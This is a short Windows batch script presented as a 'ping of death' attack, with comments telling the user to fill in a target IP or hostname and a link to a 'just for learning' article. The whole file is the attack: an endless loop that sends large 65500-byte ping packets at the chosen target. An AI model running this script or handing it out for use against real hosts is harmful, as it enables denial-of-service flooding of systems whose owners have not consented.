# Set the <IO Address> to the ip or hostname of your target.
# Once the script run, it will loop forever and ...
# See: https://fossbytes.com/perform-ping-of-death-attack-using-cmd-just-for-learning/

:loop
ping <IP Address> -l 65500 -w 1 -n 1
goto :loop